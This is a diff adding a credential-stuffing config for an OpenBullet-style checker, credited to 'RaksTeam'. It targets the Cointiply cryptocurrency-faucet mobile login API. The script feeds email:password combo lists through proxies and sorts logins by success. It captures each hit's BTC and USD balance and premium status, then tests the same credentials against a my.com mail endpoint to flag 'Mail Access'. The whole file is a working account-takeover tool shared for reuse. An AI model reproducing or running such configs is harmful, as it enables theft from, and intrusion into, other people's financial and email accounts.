@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "Cointiply API",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-18T13:36:35.3210472+05:30",
+  "AdditionalInfo": "",
+  "Author": "@CommanderX18 | RaksTeam",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
+REQUEST POST "https://cointiply.com/apiv2/mobile/user/login/" 
+  CONTENT "{\"id\":null,\"balance\":null,\"daily_logins\":null,\"ref_id\":null,\"banned\":null,\"username\":null,\"password\":\"<PASS>\",\"balance_nice\":null,\"balance_btc\":null,\"balance_usd\":null,\"email\":\"<USER>\",\"first_name\":null,\"last_name\":null,\"api_token\":null,\"push_token\":\"cIH6g65fb6Q:APA91bFBCavMW1uLbWLW-T4TN1_gUc9BvPXKS6YlsR9Hpf-rQXvdUGwUsaYU3qqMWM39rUAKtSzM62aYWSd4rwmdNwK8-KFNOuPuJKEIXBlKFdV5HKt2ldGsibpyrfVstpvlPw7iCgSR\",\"country\":null,\"ip\":null,\"referral_id\":null,\"campaign_id\":null,\"sub_id\":null,\"ad_id\":\"0c514366-1e6e-4425-ab14-999d0e2b8d50\",\"avatar_url\":null,\"role\":null,\"total_interest_earned\":\"0\",\"apps_flyer_id\":\"1621113292071-2504595037678671183\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "user-agent: Dart/2.7 (dart:io)" 
+  HEADER "app-source: mobile" 
+  HEADER "accept: application/json" 
+  HEADER "api-version: 2.0" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "host: cointiply.com" 
+  HEADER "authorization: Bearer" 
+  HEADER "app-version: 1.4" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+    KEY "\",\"status\":\"error" 
+  KEYCHAIN Success OR 
+    KEY "user\":{\"id\":" 
+    KEY "username\":\"" 
+    KEY "level\":\"" 
+    KEY "status\":\"success" 
+    KEY "message\":\"Login Successful" 
+
+#level PARSE "<SOURCE>" LR "level\":\"" "\",\"" CreateEmpty=FALSE -> CAP "level" 
+
+#balance PARSE "<SOURCE>" LR "balance\":" ",\"" CreateEmpty=FALSE -> CAP "balance" 
+
+#num_logins PARSE "<SOURCE>" LR "num_logins\":" ",\"" CreateEmpty=FALSE -> CAP "num_logins" 
+
+#created_at PARSE "<SOURCE>" LR "created_at\":\"" " " CreateEmpty=FALSE -> CAP "created_at" 
+
+#ptc_balance PARSE "<SOURCE>" LR "ptc_balance\":" ",\"" CreateEmpty=FALSE -> CAP "ptc_balance" 
+
+#gem_balance PARSE "<SOURCE>" LR "gem_balance\":" ",\"" CreateEmpty=FALSE -> CAP "gem_balance" 
+
+#claim_count PARSE "<SOURCE>" LR "claim_count\":\"" "\",\"" CreateEmpty=FALSE -> CAP "claim_count" 
+
+#loyalty_bonus PARSE "<SOURCE>" LR "loyalty_bonus\":" ",\"" CreateEmpty=FALSE -> CAP "loyalty_bonus" 
+
+#is_premium PARSE "<SOURCE>" LR "is_premium\":" ",\"" CreateEmpty=FALSE -> CAP "is_premium" 
+
+#country PARSE "<SOURCE>" LR "country\":\"" "\",\"" CreateEmpty=FALSE -> CAP "country" 
+
+#balance_nice PARSE "<SOURCE>" LR "balance_nice\":\"" "\",\"" CreateEmpty=FALSE -> CAP "balance_nice" 
+
+#balance_btc PARSE "<SOURCE>" LR "balance_btc\":" ",\"" CreateEmpty=FALSE -> CAP "balance_btc" 
+
+#balance_usd PARSE "<SOURCE>" LR "balance_usd\":" ",\"" CreateEmpty=FALSE -> CAP "balance_usd" 
+
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<balance>" LessThan "30000" 
+  KEYCHAIN Success OR 
+    KEY "<balance>" EqualTo "30000" 
+
+IF "<SOURCE>" Contains "Ok=1"
+
+FUNCTION Constant "True" -> CAP "Mail Access" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Mail Access" 
+
+ENDIF
+
+FUNCTION Constant "CommanderX | RaksTeam" -> CAP "Config By" 
+
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
